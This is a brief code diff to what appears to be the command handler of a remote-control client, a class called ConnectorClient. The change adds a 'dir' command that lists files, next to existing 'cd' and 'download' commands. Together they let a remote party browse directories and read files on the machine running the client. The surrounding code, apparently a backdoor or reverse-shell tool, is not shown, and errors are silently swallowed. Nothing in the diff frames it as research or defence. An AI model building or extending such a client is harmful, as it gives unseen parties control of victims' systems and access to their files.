@@ -106,7 +106,9 @@ class ConnectorClient:
             except:
                 pass
             try:
-                if command[0:2] == "cd":
+                if command == "dir":
+                    command_result = str(os.listdir())
+                elif command[0:2] == "cd":
                     command_result = self.change_working_directory(command[3:])
                 elif command[0:8] == "download":
                     command_result = self.read_file(command[9:])
